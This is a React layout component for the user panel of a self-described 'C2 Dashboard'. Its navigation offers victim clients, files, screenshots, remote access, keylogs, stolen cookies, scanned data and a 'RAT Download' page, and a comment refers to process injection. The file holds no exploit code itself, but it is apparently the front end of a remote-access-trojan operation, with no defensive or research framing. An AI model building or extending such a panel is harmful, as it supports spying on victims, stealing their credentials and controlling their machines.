import { useEffect } from 'react'
import { Outlet } from 'react-router-dom'
import { NavLink } from 'react-router-dom'
import {
  FolderOpen,
  Image,
  Keyboard,
  LayoutDashboard,
  MonitorSmartphone,
  UserCircle,
  LogOut,
  Download,
  Globe,
  Cookie,
  Scan,
} from 'lucide-react'
import { useDashboardStore } from '../store/dashboardStore.ts'
import { useClientSync } from '../hooks/useClientSync'

interface GenLayoutProps {
  user?: {
    id: string;
    username: string;
    role: 'admin' | 'user';
  };
  onLogout?: () => void;
}

export default function GenLayout({ user, onLogout }: GenLayoutProps) {
  const { clearImpersonation, impersonateUserId } = useDashboardStore()
  useClientSync()

  useEffect(() => {
    if (user && impersonateUserId) {
      clearImpersonation()
    }
  }, [user, impersonateUserId, clearImpersonation])

  // User-specific nav items (regular users don't get process injection or settings)
  const userNavItems = [
    { to: '/user/dashboard', label: 'Dashboard', icon: LayoutDashboard },
    { to: '/user/clients', label: 'Clients', icon: MonitorSmartphone },
    { to: '/user/files', label: 'Files', icon: FolderOpen },
    { to: '/user/screenshots', label: 'Screenshots', icon: Image },{ to: '/user/stream', label: 'Remote Access', icon: Image },
    { to: '/user/keylogs', label: 'Keylogs', icon: Keyboard },
    { to: '/user/cookies', label: 'Cookies', icon: Cookie },
    { to: '/user/scanned-data', label: 'Scanned Data', icon: Scan },
    { to: '/user/rat-download', label: 'RAT Download', icon: Download },
  ];

  // If no user, just render outlet (for public routes like /database-test)
  if (!user) {
    return (
      <div className="min-h-full bg-slate-950 text-slate-100">
        <Outlet />
      </div>
    );
  }

  return (
    <div className="h-screen overflow-hidden bg-slate-950 text-slate-100">
      {/* Sidebar */}
      <div className="fixed left-0 top-0 flex h-full w-64 min-h-0 flex-col border-r border-slate-800 bg-slate-900">
        <div className="p-6">
          <h1 className="text-2xl font-bold text-white">C2 Dashboard</h1>
          <p className="text-slate-400 text-sm mt-1">User Panel</p>
        </div>

        {/* User info */}
        <div className="px-6 py-4 border-t border-slate-800">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-slate-700 flex items-center justify-center">
              <UserCircle className="w-6 h-6 text-slate-300" />
            </div>
            <div>
              <p className="font-medium text-white">{user.username}</p>
              <p className="text-xs text-slate-400 capitalize">{user.role}</p>
            </div>
          </div>
        </div>

        {/* Navigation */}
        <nav className="mt-6 min-h-0 flex-1 overflow-y-auto px-4 pb-4">
          <ul className="space-y-2">
            {userNavItems.map((item) => (
              <li key={item.to}>
                <NavLink
                  to={item.to}
                  className={({ isActive }) =>
                    `flex items-center gap-3 px-4 py-3 rounded-lg transition-colors ${
                      isActive
                        ? 'border border-dashed border-brand-500 bg-brand-600/20 text-brand-500'
                        : 'text-slate-300 hover:bg-slate-800'
                    }`
                  }
                >
                  <item.icon className="w-5 h-5" />
                  <span>{item.label}</span>
                </NavLink>
              </li>
            ))}
          </ul>
        </nav>

        {/* Logout button */}
        {onLogout && (
          <div className="mt-auto border-t border-slate-800 p-4">
            <button
              onClick={onLogout}
              className="flex items-center gap-3 w-full px-4 py-3 text-slate-300 hover:bg-slate-800 rounded-lg transition-colors"
            >
              <LogOut className="w-5 h-5" />
              <span>Logout</span>
            </button>
          </div>
        )}
      </div>

      {/* Main content */}
      <div className="main-scrollbar ml-64 h-full overflow-y-auto overflow-x-hidden p-8">
        <Outlet />
      </div>
    </div>
  );
}
